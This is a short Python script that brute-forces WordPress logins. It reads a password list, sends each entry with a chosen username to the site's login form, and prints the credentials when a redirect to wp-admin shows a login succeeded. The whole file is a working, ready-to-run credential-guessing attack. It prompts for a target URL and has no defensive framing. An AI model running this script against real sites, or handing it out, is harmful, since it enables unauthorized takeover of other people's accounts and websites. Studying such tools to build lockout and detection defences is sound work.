import requests

def brute_force(url, username, password_list):
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
        response = requests.post(url, data=data)
        
        if 'wp-admin' in response.url:
            print(f"[+] SUCCESS: {username}:{password}")
            break
        else:
            print(f"[-] Failed: {password}")

if __name__ == "__main__":
    url = input("Enter WordPress login URL: ")
    username = input("Enter Username: ")
    password_list = input("Enter password list file path: ")
    brute_force(url, username, password_list)